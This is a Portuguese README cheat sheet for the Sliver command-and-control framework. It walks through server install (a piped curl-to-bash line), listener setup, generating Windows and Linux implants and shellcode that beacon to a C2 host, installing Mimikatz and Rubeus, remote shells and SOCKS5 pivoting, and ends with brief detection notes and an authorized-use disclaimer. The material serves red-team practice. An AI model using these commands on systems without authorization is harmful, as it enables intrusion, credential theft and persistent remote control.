<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚔️ Sliver C2 - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ██████╗██████╗ 
  ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚════██╗
  ███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ██║      █████╔╝
  ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║     ██╔═══╝ 
  ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ╚██████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝
       Modern Open-Source Command & Control (C2) Framework by Bishop Fox
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/Sliver-C2_Framework-blue?style=for-the-badge" alt="Sliver">
  <img src="https://img.shields.io/badge/Author-Bishop_Fox-orange?style=for-the-badge" alt="Bishop Fox">
  <img src="https://img.shields.io/badge/Language-Go-cyan?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Category-C2_&_Red_Team-red?style=for-the-badge" alt="Equipe Vermelha">
</p>

<p alinhar="centro">
  <b>⚔️ Emulação de adversário moderna, multiplataforma e de código aberto e estrutura de comando e controle com suporte aos protocolos mTLS, WireGuard, HTTP(S) e DNS</b>
</p>

---

## 📋 Índice

- [Visão geral e arquitetura](#-visão geral--arquitetura)
- [Instalação e configuração do servidor](#-installation--server-setup)
  - [Instalação automatizada de One-Liner](#automated-one-liner-install)
  - [Configuração do operador multijogador](#configuração do operador multijogador)
- [Configuração do ouvinte (mTLS, HTTP, WireGuard, DNS)](#-listener-configuration-mtls-http-wireguard-dns)
- [Gerando Implantes (Beacons vs Sessões)](#-generating-implants-beacons-vs-sessions)
  - [Sessões interativas versus beacons assíncronos](#sessões interativas versus beacons assíncronos)
  - [Implantes Windows EXE e Shellcode](#windows-exe--shellcode-implants)
  - [Implantes ELF para Linux e macOS](#linux--macos-elf-implants)
- [Pós-exploração e ecossistema de arsenal](#-pós-exploração--ecossistema de arsenal)
  - [Instalando extensões de arsenal (BOFs, Donut, cinto de segurança)](#instalando-armory-extensions-bofs-donut-seatbelt)
  - [Acesso credencial e Mimikatz](#acesso credencial--mimikatz)
  - [Pivoting & Dynamic-SOCKS5](#pivoting--dynamic-socks5)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações defensivas e detecção](#-considerações defensivas--detecção)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e arquitetura

Projetado em Go por **Bishop Fox**, **Sliver** é uma das principais alternativas de código aberto para estruturas C2 comerciais (Cobalt Strike, Brute Ratel):
- **Plataforma cruzada:** Servidores e implantes suportam Windows, Linux e macOS em `x86_64`, `arm64` e `arm`.
- **Comunicação evasiva:** Suporte pronto para uso para TLS mútuo (mTLS), túneis UDP WireGuard, HTTP/HTTPS com geração canário processual e tunelamento DNS.
- **Execução na memória:** Injeção de DLL reflexiva nativa, Beacon Object Files (BOFs), execução .NET inline via Donut e esvaziamento de processo.
- **Arquitetura Multijogador:** Colaboração em tempo real entre vários operadores da equipe vermelha por meio de perfis de operador assinados criptograficamente.

---

## 📥 Instalação e configuração do servidor

### Instalação automatizada de uma linha
```bash
# Download and install sliver-server and sliver-client
curl -s https://sliver.sh/install | sudo bash

# Start the Sliver background daemon
sudo systemctl enable --now sliver
```
### Configuração do operador multijogador
Crie um perfil de operador no servidor C2 para um membro da equipe:
```bash
# On the C2 server
sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.sliver

# On the operator's laptop
sliver-client import /path/to/alice.sliver
sliver-client
```
---

## 🎧 Configuração do ouvinte (mTLS, HTTP, WireGuard, DNS)

Dentro do console `sliver`:
```text
# Start mutual TLS listener on port 8888
[sliver] > mtls --lport 8888

# Start HTTPS listener on port 443 with automated Let's Encrypt certificates
[sliver] > https --lport 443 --domain c2.example.com

# Start lightweight WireGuard listener on port 53/UDP
[sliver] > wg --lport 53

# Verify running listeners
[sliver] > jobs
```
---

## 🚀 Gerando Implantes (Beacons vs Sessões)

### Sessões interativas versus beacons assíncronos
- **Sessão:** Conexão TCP/TLS em tempo real com resposta de comando instantânea. Maior visibilidade da rede.
- **Beacon:** Batimento cardíaco assíncrono que dorme por intervalos com jitter aleatório. É muito mais difícil para os SOCs identificarem por meio da análise de anomalias de rede.

### Implantes Windows EXE e Shellcode
```text
# Generate a Windows x64 interactive mTLS session implant
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe --save /tmp/payload.exe

# Generate a stealthy HTTP beacon implant with 60s sleep and 20% jitter
[sliver] > generate beacon --http https://c2.example.com:443 --seconds 60 --jitter 20 --os windows --format exe

# Generate raw x64 position-independent shellcode
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --format shellcode --save /tmp/shellcode.bin
```
### Implantes ELF para Linux e macOS
```text
# Linux x64 ELF binary
[sliver] > generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf --save /tmp/agent.elf
```
---

## 🛠️ Ecossistema Pós-Exploração e Arsenal

### Instalando extensões de arsenal (BOFs, Donut, cinto de segurança)
The Armory é o gerenciador de pacotes integrado do Sliver para ferramentas ofensivas de terceiros e arquivos de objeto Cobalt Strike Beacon (BOFs):
```text
# Update package list
[sliver] > armory update

# Install popular extensions
[sliver] > armory install bof-roast
[sliver] > armory install seatbelt
[sliver] > armory install rubeus
[sliver] > armory install mimikatz
```
### Interagindo com sessões e beacons
```text
# List active sessions
[sliver] > sessions

# Interact with a specific session
[sliver] > use <SESSION_ID>

# Take a screenshot
[sliver] (session) > screenshot

# Spawn an interactive shell
[sliver] (session) > shell

# Execute .NET assembly in-memory without touching disk
[sliver] (session) > execute-assembly /opt/Seatbelt.exe -group=system
```
### Pivotantes e Dinâmicos SOCKS5
Direcione ferramentas ofensivas externas diretamente para a rede alvo comprometida:
```text
# Start SOCKS5 proxy on local port 1080 of the C2 client
[sliver] (session) > socks5 start --port 1080

# Check active pivots
[sliver] > pivots
```
---

## ⚡ Tabela de referência rápida

| Objetivo | Comando |
|-----------|---------|
| **Iniciar ouvinte mTLS** | `mtls --lport 8888` |
| **Iniciar ouvinte HTTPS** | `https --lport 443 --domain c2.domain.com` |
| **Gerar EXE de sessão** | `generate --mtls <IP>:8888 --os windows -f exe` |
| **Gerar Beacon EXE** | `generate beacon --http <URL> --seconds 60 -f exe` |
| **Gerar Shellcode bruto** | `generate --mtls <IP>:8888 -f shellcode` |
| **Listar e interagir sessões**| `sessions` ->`use <ID>` |
| **Instalar ferramentas do Arsenal** | `armory install seatbelt mimikatz` |
| **Execução .NET na memória**| `execute-assembly /path/to/binary.exe <args>` |
| **Proxy reverso SOCKS5** | `socks5 start --port 1080` |

---

## 🛡️ Considerações defensivas e detecção

1. **Impressão digital JARM:** Os ouvintes HTTP Sliver padrão podem ter perfil criado usando impressão digital JARM TLS ativa. Personalize cifras TLS na configuração Sliver.
2. **YARA e análise binária:** Os implantes padrão produzidos por `generate` contêm metadados Golang e estruturas de símbolos, a menos que sejam ofuscados por meio de ilegibilidade (`--skip-symbols`).

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> Sliver é uma simulação avançada de adversário e uma estrutura de comando e controle de equipe vermelha. Deve ser implantado exclusivamente em trabalhos autorizados com regras de engajamento (RoE) claras. O uso não autorizado em computadores de terceiros é estritamente ilegal.